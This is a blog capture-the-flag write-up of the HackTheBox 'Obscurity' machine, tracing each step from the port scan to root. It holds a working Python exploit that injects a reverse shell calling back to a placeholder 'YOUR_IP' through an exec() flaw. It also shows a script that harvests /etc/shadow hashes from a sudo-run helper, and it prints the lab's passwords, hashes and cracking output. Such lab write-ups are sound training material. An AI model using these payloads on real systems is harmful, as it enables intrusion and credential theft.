@@ -1,0 +1,1025 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+    <title>Obscurity HTB WriteUp :: Blog</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="HTB Obscurity writeup HackTheBox Obscurity machine write up, easy Linux machine. The process as always: Scan &amp;ndash;&amp;gt; Initial foothold &amp;ndash;&amp;gt; Own User &amp;ndash;&amp;gt; Own Root.
+Initial Scan bash    # added to hosts as 10.10.10.168 Obscurity $ sudo nmap -sV -sC -sT -O -o nmapinitial obscurity   Scan results nmap    Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-07 02:44 CET Nmap scan report for Obscurity (10." />
+<meta name="keywords" content="write, blog" />
+<meta name="robots" content="noodp" />
+<link rel="canonical" href="https://raulmart.in/posts/obscure-writeup/" />
+
+
+
+
+
+
+
+<link rel="stylesheet" href="https://raulmart.in/css/style.min.css">
+
+
+
+
+<link rel="stylesheet" href="https://raulmart.in/style.css">
+
+
+<link rel="apple-touch-icon-precomposed" sizes="144x144" href="https://raulmart.in/img/apple-touch-icon-144-precomposed.png">
+
+  <link rel="shortcut icon" href="https://raulmart.in/img/favicon/orange.png">
+
+
+
+<meta name="twitter:card" content="summary" />
+
+<meta name="twitter:creator" content="SergioP3red" />
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="Obscurity HTB WriteUp :: Blog">
+<meta property="og:description" content="HackTheBox Obscurity machine write up. Easy Linux machine." />
+<meta property="og:url" content="https://raulmart.in/posts/obscure-writeup/" />
+<meta property="og:site_name" content="Obscurity HTB WriteUp" />
+
+  <meta property="og:image" content="https://raulmart.in/cover/obscurity.png">
+
+<meta property="og:image:width" content="2048">
+<meta property="og:image:height" content="1024">
+
+
+  <meta property="article:published_time" content="2020-03-16 00:00:00 &#43;0000 UTC" />
+
+
+
+
+
+
+
+
+
+
+
+
+</head>
+<body class="orange">
+
+
+<div class="container center headings--one-size">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="/">
+  <div class="logo">
+    Blog
+  </div>
+</a>
+
+    </div>
+    <div class="menu-trigger">menu</div>
+  </div>
+  
+    <nav class="menu">
+  <ul class="menu__inner menu__inner--desktop">
+    
+      
+        
+          <li><a href="/about">About</a></li>
+        
+      
+        
+          <li><a href="/tags/writeup/">WriteUps</a></li>
+        
+      
+      
+    
+
+    
+    <div class="spacer"></div>
+    <ul class="language-selector">
+      <ul class="language-selector-current">
+          <li>English ▾</li>
+      </ul>
+      <ul class="language-selector__more hidden">
+        
+        <li><a href="https://raulmart.in/">English</a></li>
+        
+        <li><a href="https://raulmart.in/es/">Español</a></li>
+        
+      </ul>
+    </ul>
+    
+  </ul>
+
+  <ul class="menu__inner menu__inner--mobile">
+    
+      
+        <li><a href="/about">About</a></li>
+      
+    
+      
+        <li><a href="/tags/writeup/">WriteUps</a></li>
+      
+    
+    
+    <hr />
+        
+          <li>
+            <a href="https://raulmart.in/">English</a>
+          </li>
+        
+          <li>
+            <a href="https://raulmart.in/es/">Español</a>
+          </li>
+        
+    
+  </ul>
+</nav>
+
+  
+</header>
+
+
+  <div class="content">
+    
+<div class="post">
+  <h1 class="post-title">
+    <a href="https://raulmart.in/posts/obscure-writeup/">Obscurity HTB WriteUp</a></h1>
+  <div class="post-meta">
+    
+      <span class="post-date">
+        2020-03-16 
+      </span>
+    
+    
+    <span class="post-author">:: Sergio Pérez</span>
+    
+  </div>
+
+  
+  <span class="post-tags">
+    
+    #<a href="https://raulmart.in/tags/writeup/">writeup</a>&nbsp;
+    
+    #<a href="https://raulmart.in/tags/hackthebox/">hackthebox</a>&nbsp;
+    
+    #<a href="https://raulmart.in/tags/linux/">linux</a>&nbsp;
+    
+    #<a href="https://raulmart.in/tags/easy/">easy</a>&nbsp;
+    
+  </span>
+  
+
+  
+    <img src="https://raulmart.in/cover/obscurity.png" class="post-cover" alt="Obscurity HTB WriteUp" />
+  
+
+  
+
+  <div class="post-content"><div>
+        <h1 id="htb-obscurity-writeup">HTB Obscurity writeup<a href="#htb-obscurity-writeup" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>HackTheBox Obscurity machine write up, easy Linux machine.
+The process as always: Scan &ndash;&gt; Initial foothold &ndash;&gt; Own User &ndash;&gt; Own Root.</p>
+<h2 id="initial-scan">Initial Scan<a href="#initial-scan" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+
+
+
+  <div class="collapsable-code">
+    <input id="647231958" type="checkbox"  />
+    <label for="647231958">
+      <span class="collapsable-code__language">bash</span>
+      
+      <span class="collapsable-code__toggle" data-label-expand="△" data-label-collapse="▽"></span>
+    </label>
+    <pre class="language-bash" ><code>
+# added to hosts as 10.10.10.168    Obscurity
+$ sudo nmap -sV -sC -sT -O -o nmapinitial obscurity
+</code></pre>
+  </div>
+
+
+<p>Scan results
+
+
+
+  <div class="collapsable-code">
+    <input id="519328674" type="checkbox"  />
+    <label for="519328674">
+      <span class="collapsable-code__language">nmap</span>
+      
+      <span class="collapsable-code__toggle" data-label-expand="△" data-label-collapse="▽"></span>
+    </label>
+    <pre class="language-nmap" ><code>
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-07 02:44 CET
+Nmap scan report for Obscurity (10.10.10.168)
+Host is up (0.12s latency).
+Not shown: 995 closed ports
+PORT      STATE    SERVICE       VERSION
+22/tcp    open     ssh           OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+80/tcp    closed   http
+8080/tcp  open     http-proxy	 BadHTTPServer
+9000/tcp  closed unknown
+15003/tcp filtered unknown
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+
+Network Distance: 2 hops
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 42.54 seconds
+
+</code></pre>
+  </div>
+
+</p>
+<p>As we can see, we have an http server running at 8080 port. So we will start by accessing this site through the browser.</p>
+<p><img src="images/8080.png" alt="Website on port 8080"></p>
+<p>The website on port 8080 looks like a standard webpage. If we dig into the code of page, we will find an interesting message to &ldquo;server devs&rdquo;: the current source code for the web server is in &lsquo;SuperSecureServer.py&rsquo; in the secret development directory.</p>
+<p><img src="images/message.png" alt="Message in the source code of webpage"></p>
+<p>So we will use the <a href="https://github.com/xmendez/wfuzz">wfuzz</a> tool to try to find that secret development directory. Concretely, we will use the common wordlist included in the tool&rsquo;s GitHub repository.</p>
+<p>
+
+
+  <div class="collapsable-code">
+    <input id="968541723" type="checkbox"  />
+    <label for="968541723">
+      <span class="collapsable-code__language">bash</span>
+      
+      <span class="collapsable-code__toggle" data-label-expand="△" data-label-collapse="▽"></span>
+    </label>
+    <pre class="language-bash" ><code>
+wfuzz -c -z file,common.txt -u http://10.10.10.168:8080/FUZZ/SuperSecureServer.py
+</code></pre>
+  </div>
+
+
+Bingo! We have a 200 status code when we try to access the &ldquo;develop&rdquo; directory.
+<img src="images/wfuzz.png" alt="Wfuzz Results"></p>
+<p>We access to the python file containing the code of the server:</p>
+<p>
+
+
+  <div class="collapsable-code">
+    <input id="423851697" type="checkbox"  />
+    <label for="423851697">
+      <span class="collapsable-code__language">python</span>
+      
+      <span class="collapsable-code__toggle" data-label-expand="△" data-label-collapse="▽"></span>
+    </label>
+    <pre class="language-python" ><code>
+import socket
+import threading
+from datetime import datetime
+import sys
+import os
+import mimetypes
+import urllib.parse
+import subprocess
+
+respTemplate = &#34;&#34;&#34;HTTP/1.1 {statusNum} {statusCode}
+Date: {dateSent}
+Server: {server}
+Last-Modified: {modified}
+Content-Length: {length}
+Content-Type: {contentType}
+Connection: {connectionType}
+
+{body}
+&#34;&#34;&#34;
+DOC_ROOT = &#34;DocRoot&#34;
+
+CODES = {&#34;200&#34;: &#34;OK&#34;, 
+        &#34;304&#34;: &#34;NOT MODIFIED&#34;,
+        &#34;400&#34;: &#34;BAD REQUEST&#34;, &#34;401&#34;: &#34;UNAUTHORIZED&#34;, &#34;403&#34;: &#34;FORBIDDEN&#34;, &#34;404&#34;: &#34;NOT FOUND&#34;, 
+        &#34;500&#34;: &#34;INTERNAL SERVER ERROR&#34;}
+
+MIMES = {&#34;txt&#34;: &#34;text/plain&#34;, &#34;css&#34;:&#34;text/css&#34;, &#34;html&#34;:&#34;text/html&#34;, &#34;png&#34;: &#34;image/png&#34;, &#34;jpg&#34;:&#34;image/jpg&#34;, 
+        &#34;ttf&#34;:&#34;application/octet-stream&#34;,&#34;otf&#34;:&#34;application/octet-stream&#34;, &#34;woff&#34;:&#34;font/woff&#34;, &#34;woff2&#34;: &#34;font/woff2&#34;, 
+        &#34;js&#34;:&#34;application/javascript&#34;,&#34;gz&#34;:&#34;application/zip&#34;, &#34;py&#34;:&#34;text/plain&#34;, &#34;map&#34;: &#34;application/octet-stream&#34;}
+
+
+class Response:
+    def __init__(self, **kwargs):
+        self.__dict__.update(kwargs)
+        now = datetime.now()
+        self.dateSent = self.modified = now.strftime(&#34;%a, %d %b %Y %H:%M:%S&#34;)
+    def stringResponse(self):
+        return respTemplate.format(**self.__dict__)
+
+class Request:
+    def __init__(self, request):
+        self.good = True
+        try:
+            request = self.parseRequest(request)
+            self.method = request[&#34;method&#34;]
+            self.doc = request[&#34;doc&#34;]
+            self.vers = request[&#34;vers&#34;]
+            self.header = request[&#34;header&#34;]
+            self.body = request[&#34;body&#34;]
+        except:
+            self.good = False
+
+    def parseRequest(self, request):        
+        req = request.strip(&#34;\r&#34;).split(&#34;\n&#34;)
+        method,doc,vers = req[0].split(&#34; &#34;)
+        header = req[1:-3]
+        body = req[-1]
+        headerDict = {}
+        for param in header:
+            pos = param.find(&#34;: &#34;)
+            key, val = param[:pos], param[pos&#43;2:]
+            headerDict.update({key: val})
+        return {&#34;method&#34;: method, &#34;doc&#34;: doc, &#34;vers&#34;: vers, &#34;header&#34;: headerDict, &#34;body&#34;: body}
+
+
+class Server:
+    def __init__(self, host, port):    
+        self.host = host
+        self.port = port
+        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        self.sock.bind((self.host, self.port))
+
+    def listen(self):
+        self.sock.listen(5)
+        while True:
+            client, address = self.sock.accept()
+            client.settimeout(60)
+            threading.Thread(target = self.listenToClient,args = (client,address)).start()
+
+    def listenToClient(self, client, address):
+        size = 1024
+        while True:
+            try:
+                data = client.recv(size) # 收到客户端的数据，应该就是数据包
+                if data:
+                    # Set the response to echo back the recieved data 
+                    req = Request(data.decode()) # byte转str，返回的req是list
+                    self.handleRequest(req, client, address)
+                    client.shutdown()
+                    client.close()
+                else:
+                    raise error(&#39;Client disconnected&#39;)
+            except:
+                client.close()
+                return False
+    
+    def handleRequest(self, request, conn, address):
+        if request.good:
+#            try:
+                # print(str(request.method) &#43; &#34; &#34; &#43; str(request.doc), end=&#39; &#39;)
+                # print(&#34;from {0}&#34;.format(address[0]))
+#            except Exception as e:
+#                print(e)
+            document = self.serveDoc(request.doc, DOC_ROOT)
+            statusNum=document[&#34;status&#34;]
+        else:
+            document = self.serveDoc(&#34;/errors/400.html&#34;, DOC_ROOT)
+            statusNum=&#34;400&#34;
+        body = document[&#34;body&#34;]
+        
+        statusCode=CODES[statusNum]
+        dateSent = &#34;&#34;
+        server = &#34;BadHTTPServer&#34;
+        modified = &#34;&#34;
+        length = len(body)
+        contentType = document[&#34;mime&#34;] # Try and identify MIME type from string
+        connectionType = &#34;Closed&#34;
+
+
+        resp = Response(
+        statusNum=statusNum, statusCode=statusCode, 
+        dateSent = dateSent, server = server, 
+        modified = modified, length = length, 
+        contentType = contentType, connectionType = connectionType, 
+        body = body
+        )
+
+        data = resp.stringResponse()
+        if not data:
+            return -1
+        conn.send(data.encode())
+        return 0
+
+    def serveDoc(self, path, docRoot):
+        path = urllib.parse.unquote(path)
+        try:
+            info = &#34;output = &#39;Document: {}&#39;&#34; # Keep the output for later debug
+            exec(info.format(path)) # This is how you do string formatting, right?
+            cwd = os.path.dirname(os.path.realpath(__file__))
+            docRoot = os.path.join(cwd, docRoot)
+            if path == &#34;/&#34;:
+                path = &#34;/index.html&#34;
+            requested = os.path.join(docRoot, path[1:])
+            if os.path.isfile(requested):
+                mime = mimetypes.guess_type(requested)
+                mime = (mime if mime[0] != None else &#34;text/html&#34;)
+                mime = MIMES[requested.split(&#34;.&#34;)[-1]]
+                try:
+                    with open(requested, &#34;r&#34;) as f:
+                        data = f.read()
+                except:
+                    with open(requested, &#34;rb&#34;) as f:
+                        data = f.read()
+                status = &#34;200&#34;
+            else:
+                errorPage = os.path.join(docRoot, &#34;errors&#34;, &#34;404.html&#34;)
+                mime = &#34;text/html&#34;
+                with open(errorPage, &#34;r&#34;) as f:
+                    data = f.read().format(path)
+                status = &#34;404&#34;
+        except Exception as e:
+            print(e)
+            errorPage = os.path.join(docRoot, &#34;errors&#34;, &#34;500.html&#34;)
+            mime = &#34;text/html&#34;
+            with open(errorPage, &#34;r&#34;) as f:
+                data = f.read()
+            status = &#34;500&#34;
+        return {&#34;body&#34;: data, &#34;mime&#34;: mime, &#34;status&#34;: status}
+</code></pre>
+  </div>
+
+
+We find an interesting behavior in the serveDoc method:</p>
+
+
+
+  <div class="collapsable-code">
+    <input id="589736241" type="checkbox"  />
+    <label for="589736241">
+      <span class="collapsable-code__language">python</span>
+      
+      <span class="collapsable-code__toggle" data-label-expand="△" data-label-collapse="▽"></span>
+    </label>
+    <pre class="language-python" ><code>
+def serveDoc(self, path, docRoot):
+        path = urllib.parse.unquote(path)
+        try:
+            info = &#34;output = &#39;Document: {}&#39;&#34; # Keep the output for later debug
+            exec(info.format(path)) # This is how you do string formatting, right?
+            cwd = os.path.dirname(os.path.realpath(__file__))
+            docRoot = os.path.join(cwd, docRoot)
+</code></pre>
+  </div>
+
+
+<p>As we can see, an exec function is called, with an interesting comment in the same line <code>(__This is how you do string formatting, right?__)</code> that make us think that it could be exploitable by command injection. We craft an script to gain reverse shell through Python:</p>
+<p>
+
+
+  <div class="collapsable-code">
+    <input id="341278569" type="checkbox"  />
+    <label for="341278569">
+      <span class="collapsable-code__language">python</span>
+      
+      <span class="collapsable-code__toggle" data-label-expand="△" data-label-collapse="▽"></span>
+    </label>
+    <pre class="language-python" ><code>
+import requests
+import urllib
+import os
+
+url = &#39;http://10.10.10.168:8080/&#39;
+
+path=&#39;5\&#39;&#39;&#43;&#39;\nimport socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;YOUR_IP&#34;,9999));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&#34;/bin/bash&#34;,&#34;-i&#34;])\na=\&#39;&#39;
+
+payload = urllib.parse.quote(path)
+print(&#34;payload&#34;)
+print(url&#43;payload)
+
+r= requests.get(url&#43;payload)
+print(r.headers)
+print(r.text)
+</code></pre>
+  </div>
+
+
+As a curiosity, I could not gain a reverse shell without inject the initial &lsquo;5'&rsquo; to the path. The reverse shell used can be found <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#python">here</a>.</p>
+<p>Once we execute the script, we have a reverse shell as www-data. We can check the /home directory and access to user&rsquo;s robert directory. There are five interesting files:</p>
+<ul>
+<li>check.txt</li>
+<li>out.txt</li>
+<li>passwordreminder.txt</li>
+<li>BetterSSH.py</li>
+<li>SuperSecureCrypt.py</li>
+</ul>
+<p>If we check the content of the check.txt file we can see the next message:</p>
+
+
+
+  <div class="collapsable-code">
+    <input id="432619587" type="checkbox"  />
+    <label for="432619587">
+      <span class="collapsable-code__language">bash</span>
+      
+      <span class="collapsable-code__toggle" data-label-expand="△" data-label-collapse="▽"></span>
+    </label>
+    <pre class="language-bash" ><code>
+$ cat check.txt
+Encrypting this file with your key should result in out.txt, make sure your key is correct!
+</code></pre>
+  </div>
+
+
+<p>If we try to check the content of out.txt and passwordreminder.txt, we will find that they are encrypted by some method. By intuition, we can assume that these files have been ciphered using the SuperSecureCrypt.py script, so we will take a look over this Python file. The content is the following:</p>
+
+
+
+  <div class="collapsable-code">
+    <input id="291587634" type="checkbox"  />
+    <label for="291587634">
+      <span class="collapsable-code__language">python</span>
+      
+      <span class="collapsable-code__toggle" data-label-expand="△" data-label-collapse="▽"></span>
+    </label>
+    <pre class="language-python" ><code>
+import sys
+import argparse
+
+def encrypt(text, key):
+    keylen = len(key)
+    keyPos = 0
+    encrypted = &#34;&#34;
+    for x in text:
+        keyChr = key[keyPos]
+        newChr = ord(x)
+        newChr = chr((newChr &#43; ord(keyChr)) % 255)
+        encrypted &#43;= newChr
+        keyPos &#43;= 1
+        keyPos = keyPos % keylen
+    return encrypted
+
+def decrypt(text, key):
+    keylen = len(key)
+    keyPos = 0
+    decrypted = &#34;&#34;
+    for x in text:
+        keyChr = key[keyPos]
+        newChr = ord(x)
+        newChr = chr((newChr - ord(keyChr)) % 255)
+        decrypted &#43;= newChr
+        keyPos &#43;= 1
+        keyPos = keyPos % keylen
+    return decrypted
+
+parser = argparse.ArgumentParser(description=&#39;Encrypt with 0bscura\&#39;s encryption algorithm&#39;)
+
+parser.add_argument(&#39;-i&#39;,
+                    metavar=&#39;InFile&#39;,
+                    type=str,
+                    help=&#39;The file to read&#39;,
+                    required=False)
+
+parser.add_argument(&#39;-o&#39;,
+                    metavar=&#39;OutFile&#39;,
+                    type=str,
+                    help=&#39;Where to output the encrypted/decrypted file&#39;,
+                    required=False)
+
+parser.add_argument(&#39;-k&#39;,
+                    metavar=&#39;Key&#39;,
+                    type=str,
+                    help=&#39;Key to use&#39;,
+                    required=False)
+
+parser.add_argument(&#39;-d&#39;, action=&#39;store_true&#39;, help=&#39;Decrypt mode&#39;)
+
+args = parser.parse_args()
+
+banner = &#34;################################\n&#34;
+banner&#43;= &#34;#           BEGINNING          #\n&#34;
+banner&#43;= &#34;#    SUPER SECURE ENCRYPTOR    #\n&#34;
+banner&#43;= &#34;################################\n&#34;
+banner &#43;= &#34;  ############################\n&#34;
+banner &#43;= &#34;  #        FILE MODE         #\n&#34;
+banner &#43;= &#34;  ############################&#34;
+print(banner)
+if args.o == None or args.k == None or args.i == None:
+    print(&#34;Missing args&#34;)
+else:
+    if args.d:
+        print(&#34;Opening file {0}...&#34;.format(args.i))
+        with open(args.i, &#39;r&#39;, encoding=&#39;UTF-8&#39;) as f:
+            data = f.read()
+
+        print(&#34;Decrypting...&#34;)
+        decrypted = decrypt(data, args.k)
+
+        print(&#34;Writing to {0}...&#34;.format(args.o))
+        with open(args.o, &#39;w&#39;, encoding=&#39;UTF-8&#39;) as f:
+            f.write(decrypted)
+    else:
+        print(&#34;Opening file {0}...&#34;.format(args.i))
+        with open(args.i, &#39;r&#39;, encoding=&#39;UTF-8&#39;) as f:
+            data = f.read()
+
+        print(&#34;Encrypting...&#34;)
+        encrypted = encrypt(data, args.k)
+
+        print(&#34;Writing to {0}...&#34;.format(args.o))
+        with open(args.o, &#39;w&#39;, encoding=&#39;UTF-8&#39;) as f:
+            f.write(encrypted)
+
+</code></pre>
+  </div>
+
+
+<p>As we can see, it is a program that take four arguments: input file (-i), output file (-o), the key used to cipher/decipher the input file (-k) and the last (and optional) parameter to use the program in decipher mode (-d). Let&rsquo;s take a look at the encryption function:</p>
+<p>
+
+
+  <div class="collapsable-code">
+    <input id="284136795" type="checkbox"  />
+    <label for="284136795">
+      <span class="collapsable-code__language">python</span>
+      
+      <span class="collapsable-code__toggle" data-label-expand="△" data-label-collapse="▽"></span>
+    </label>
+    <pre class="language-python" ><code>
+def encrypt(text, key):
+    keylen = len(key)
+    keyPos = 0
+    encrypted = &#34;&#34;
+    for x in text:
+        keyChr = key[keyPos]
+        newChr = ord(x)
+        newChr = chr((newChr &#43; ord(keyChr)) % 255)
+        encrypted &#43;= newChr
+        keyPos &#43;= 1
+        keyPos = keyPos % keylen
+    return encrypted
+</code></pre>
+  </div>
+
+
+Knowing the content of check.txt and the content its corresponding ciphered file (out.txt), we can reverse the encrypt method to get the key employed to cipher the text. We can craft a Python script in order to do that:</p>
+
+
+
+  <div class="collapsable-code">
+    <input id="235469781" type="checkbox"  />
+    <label for="235469781">
+      <span class="collapsable-code__language">python</span>
+      
+      <span class="collapsable-code__toggle" data-label-expand="△" data-label-collapse="▽"></span>
+    </label>
+    <pre class="language-python" ><code>
+import string
+with open(&#39;check.txt&#39;,&#39;r&#39;,encoding=&#39;UTF-8&#39;) as f:
+    ta = f.read()
+    
+key=&#39;&#39;
+with open(&#39;out.txt&#39;,&#39;r&#39;,encoding=&#39;UTF-8&#39;) as f:
+    data = f.read()
+    for x in range(len(data)):
+        for i in range(255):
+            ch = chr((ord(data[x])-i)%255)
+            if ch == ta[x]:
+                key &#43;=chr(i)
+                break
+    print(key)
+</code></pre>
+  </div>
+
+
+<p>Basically what we do is take the plain text included in check.txt and the encoded text (out.txt) and we traverse all ASCII chars (0-255), reverting the crypt operation, i.e, we obtain the resulting char from doing ord(cipheredData), we do the subtraction of the ASCII value and make the modulus operation with 255. If resulting char and the plain text char are the same, then the current ASCII value corresponds with a char from the key and we save it.</p>
+<p>By this way we obtain the cipher key:</p>
+<p>alexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovichal</p>
+<p>The next step is obtain the SSH password for user, which is probably included in the passwordreminder.txt file.</p>
+<p>We will use the SuperSecureCrypt.py script in decryption mode, giving him the key that we just have obtained, and voila! We obtain the user password (SecThruObsFTW):</p>
+<p>
+
+
+  <div class="collapsable-code">
+    <input id="389761425" type="checkbox"  />
+    <label for="389761425">
+      <span class="collapsable-code__language">bash</span>
+      
+      <span class="collapsable-code__toggle" data-label-expand="△" data-label-collapse="▽"></span>
+    </label>
+    <pre class="language-bash" ><code>
+www-data@obscure:/home/robert$ python3 SuperSecureCrypt.py -i passwordreminder.txt -o pass.txt -k alexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovichal -d
+################################
+#           BEGINNING          #
+#    SUPER SECURE ENCRYPTOR    #
+################################
+  ############################
+  #        FILE MODE         #
+  ############################
+Opening file passwordreminder.txt...
+Decrypting...
+Writing to pass.txt...
+www-data@obscure:/home/robert$ cat pass.txt
+SecThruObsFTW
+</code></pre>
+  </div>
+
+
+Now we access via SSH to the machine with user robert and password SecThruObsFTW, and we obtain user flag:</p>
+<p>e4493782066b55fe2755708736ada2d7</p>
+<p>Let&rsquo;s see now how to make the privilege escalation.</p>
+<h2 id="root">Root<a href="#root" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>First at all we execute the sudo -l command to check our user permissions. We can see that he is capable to execute the script BetterSSH with root permissions.</p>
+<p>
+
+
+  <div class="collapsable-code">
+    <input id="472956831" type="checkbox"  />
+    <label for="472956831">
+      <span class="collapsable-code__language">bash</span>
+      
+      <span class="collapsable-code__toggle" data-label-expand="△" data-label-collapse="▽"></span>
+    </label>
+    <pre class="language-bash" ><code>
+robert@obscure:~$ sudo -l
+Matching Defaults entries for robert on obscure:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User robert may run the following commands on obscure:
+    (ALL) NOPASSWD: /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py
+</code></pre>
+  </div>
+
+
+We will take a look into this python script:</p>
+
+
+
+  <div class="collapsable-code">
+    <input id="639485127" type="checkbox"  />
+    <label for="639485127">
+      <span class="collapsable-code__language">python</span>
+      
+      <span class="collapsable-code__toggle" data-label-expand="△" data-label-collapse="▽"></span>
+    </label>
+    <pre class="language-python" ><code>
+
+
+import sys
+import random, string
+import os
+import time
+import crypt
+import traceback
+import subprocess
+
+path = &#39;&#39;.join(random.choices(string.ascii_letters &#43; string.digits, k=8))
+session = {&#34;user&#34;: &#34;&#34;, &#34;authenticated&#34;: 0}
+try:
+    session[&#39;user&#39;] = input(&#34;Enter username: &#34;)
+    passW = input(&#34;Enter password: &#34;)
+
+    with open(&#39;/etc/shadow&#39;, &#39;r&#39;) as f:
+        data = f.readlines()
+    data = [(p.split(&#34;:&#34;) if &#34;$&#34; in p else None) for p in data]
+    passwords = []
+    for x in data:
+        if not x == None:
+            passwords.append(x)
+
+    passwordFile = &#39;\n&#39;.join([&#39;\n&#39;.join(p) for p in passwords]) 
+    with open(&#39;/tmp/SSH/&#39;&#43;path, &#39;w&#39;) as f:
+        f.write(passwordFile)
+    time.sleep(.1)
+    salt = &#34;&#34;
+    realPass = &#34;&#34;
+    for p in passwords:
+        if p[0] == session[&#39;user&#39;]:
+            salt, realPass = p[1].split(&#39;$&#39;)[2:]
+            break
+
+    if salt == &#34;&#34;:
+        print(&#34;Invalid user&#34;)
+        os.remove(&#39;/tmp/SSH/&#39;&#43;path)
+        sys.exit(0)
+    salt = &#39;$6$&#39;&#43;salt&#43;&#39;$&#39;
+    realPass = salt &#43; realPass
+
+    hash = crypt.crypt(passW, salt)
+
+    if hash == realPass:
+        print(&#34;Authed!&#34;)
+        session[&#39;authenticated&#39;] = 1
+    else:
+        print(&#34;Incorrect pass&#34;)
+        os.remove(&#39;/tmp/SSH/&#39;&#43;path)
+        sys.exit(0)
+    os.remove(os.path.join(&#39;/tmp/SSH/&#39;,path))
+except Exception as e:
+    traceback.print_exc()
+    sys.exit(0)
+
+if session[&#39;authenticated&#39;] == 1:
+    while True:
+        command = input(session[&#39;user&#39;] &#43; &#34;@Obscure$ &#34;)
+        cmd = [&#39;sudo&#39;, &#39;-u&#39;,  session[&#39;user&#39;]]
+        cmd.extend(command.split(&#34; &#34;))
+        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+
+        o,e = proc.communicate()
+        print(&#39;Output: &#39; &#43; o.decode(&#39;ascii&#39;))
+        print(&#39;Error: &#39;  &#43; e.decode(&#39;ascii&#39;)) if len(e.decode(&#39;ascii&#39;)) &gt; 0 else print(&#39;&#39;)
+
+</code></pre>
+  </div>
+
+
+<p>The interesting thing is that this script accesses the /etc/shadow file, and generates a file in /tmp/SSH with its content, so executing:
+
+
+
+  <div class="collapsable-code">
+    <input id="237684159" type="checkbox"  />
+    <label for="237684159">
+      <span class="collapsable-code__language">bash</span>
+      
+      <span class="collapsable-code__toggle" data-label-expand="△" data-label-collapse="▽"></span>
+    </label>
+    <pre class="language-bash" ><code>
+sudo /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py 
+</code></pre>
+  </div>
+
+
+and introducing robert&rsquo;s credentials we will generate files in that directory. Given that the results will be stored in the tmp dir, so we need to to something to don&rsquo;t loss the results at the end of the execution. It is simple to craft a Python or a bash script that takes all the files in the /tmp/SSH dir and dump them in a directory under our control. In my case, I have made a Python script that continuously listens to the content of that dir and dumps the files in a new dir called &ldquo;hashes&rdquo;.</p>
+<p>
+
+
+  <div class="collapsable-code">
+    <input id="542187639" type="checkbox"  />
+    <label for="542187639">
+      <span class="collapsable-code__language">python</span>
+      
+      <span class="collapsable-code__toggle" data-label-expand="△" data-label-collapse="▽"></span>
+    </label>
+    <pre class="language-python" ><code>
+import shutil
+import os
+while True:
+    files = os.listdir(&#34;/tmp/SSH&#34;)
+    for file in files:
+        shutil.copy(os.path.join(&#34;/tmp/SSH&#34;, file), &#34;./hashes&#34;);
+</code></pre>
+  </div>
+
+
+We let this script running and open another SSH session as Robert, and then we execute the BetterSSH script in the previously mentioned way. We return to the previous SSH session, stop our collecting script and check if it has worked by listing the hashes directory:
+
+
+
+  <div class="collapsable-code">
+    <input id="371942658" type="checkbox"  />
+    <label for="371942658">
+      <span class="collapsable-code__language">bash</span>
+      
+      <span class="collapsable-code__toggle" data-label-expand="△" data-label-collapse="▽"></span>
+    </label>
+    <pre class="language-bash" ><code>
+robert@obscure:~/hashes$ ls
+Yebxice7
+robert@obscure:~/hashes$ cat Yebxice7
+root
+$6$riekpK4m$uBdaAyK0j9WfMzvcSKYVfyEHGtBfnfpiVbYbzbVmfbneEbo0wSijW1GQussvJSk8X1M56kzgGj8f7DFN1h4dy1
+18226
+0
+99999
+7
+
+
+
+
+robert
+$6$fZZcDG7g$lfO35GcjUmNs3PSjroqNGZjH35gN4KjhHbQxvWO0XU.TCIHgavst7Lj8wLF/xQ21jYW5nD66aJsvQSP/y1zbH/
+18163
+0
+99999
+7
+
+</code></pre>
+  </div>
+
+
+Now it will be enough to run john on the obtained root hash. Using rockyou wordlist, we obtain the password in a few seconds.</p>
+
+
+
+  <div class="collapsable-code">
+    <input id="986247531" type="checkbox"  />
+    <label for="986247531">
+      <span class="collapsable-code__language">bash</span>
+      
+      <span class="collapsable-code__toggle" data-label-expand="△" data-label-collapse="▽"></span>
+    </label>
+    <pre class="language-bash" ><code>
+root@kali:~/Descargas/htb/obscure# john --wordlist=/usr/share/wordlists/rockyou.txt shadow.txt
+Using default input encoding: UTF-8
+Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
+Cost 1 (iteration count) is 5000 for all loaded hashes
+Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status
+Mercedes.        (?)
+1g 0:00:00:00 DONE (2020-03-13 12:27) 3.703g/s 1422p/s 1422c/s 1422c/s 1422C/s angelo..michael1
+Use the &#34;--show&#34; option to display all of the cracked passwords reliably
+Session completed
+root@kali:~/Descargas/htb/obscure# john --show shadow.txt
+?:mercedes
+
+1 password hash cracked, 0 left
+root@kali:~/Descargas/htb/obscure#
+</code></pre>
